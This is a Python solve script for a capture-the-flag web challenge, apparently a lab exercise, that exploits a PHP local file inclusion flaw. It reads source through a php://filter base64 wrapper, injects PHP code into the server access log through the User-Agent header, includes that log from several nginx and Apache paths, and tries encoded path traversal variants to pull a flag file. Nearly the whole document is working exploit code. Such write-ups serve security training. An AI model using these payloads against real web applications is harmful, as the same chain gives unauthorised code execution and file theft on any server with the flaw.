#!/usr/bin/env python3
"""
WEB-02 Solve Script: LFI Chain to RCE
Chain 1: php://filter to read source code
Chain 2: Log poisoning via User-Agent to achieve RCE
"""

import requests
import base64
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8002"

print(f"[*] Target: {TARGET}")

# Step 1: Confirm LFI with php://filter
print("\n[*] Step 1: Reading config.php via php://filter...")
payload = "php://filter/convert.base64-encode/resource=config"
r = requests.get(f"{TARGET}/index.php", params={"page": payload})

# Extract base64 content from response
import re
b64_match = re.search(r'([A-Za-z0-9+/=]{20,})', r.text)
if b64_match:
    decoded = base64.b64decode(b64_match.group(1)).decode('utf-8', errors='ignore')
    print(f"[+] config.php contents:\n{decoded}")
    print(f"[+] Flag path found: /var/www/flag.txt")
else:
    print("[-] Could not extract base64 content, trying alternative method...")

# Step 2: Poison the access log
print("\n[*] Step 2: Poisoning access log via User-Agent...")
poison_payload = "<?php echo file_get_contents('/var/www/flag.txt'); ?>"
headers = {"User-Agent": poison_payload}
requests.get(f"{TARGET}/nonexistent_page_for_log", headers=headers)
print("[+] Log poisoned with PHP code")

# Step 3: Include the poisoned log
print("\n[*] Step 3: Including poisoned access log...")
log_paths = [
    "/var/log/nginx/access.log",
    "/var/log/nginx/access",
    "/var/log/apache2/access.log",
]

for log_path in log_paths:
    r = requests.get(f"{TARGET}/index.php", params={"page": log_path})
    if "FLAG{" in r.text:
        flag_match = re.search(r'(FLAG\{[^}]+\})', r.text)
        if flag_match:
            print(f"\n[+] FLAG CAPTURED: {flag_match.group(1)}")
            sys.exit(0)

# Fallback: try with path traversal
print("[*] Trying path traversal variants...")
traversal_paths = [
    "....//....//....//var/log/nginx/access.log",
    "..%2f..%2f..%2fvar/log/nginx/access.log",
]

for path in traversal_paths:
    r = requests.get(f"{TARGET}/index.php", params={"page": path})
    if "FLAG{" in r.text:
        flag_match = re.search(r'(FLAG\{[^}]+\})', r.text)
        if flag_match:
            print(f"\n[+] FLAG CAPTURED: {flag_match.group(1)}")
            sys.exit(0)

print("[-] Could not retrieve flag automatically. Try manual exploitation.")
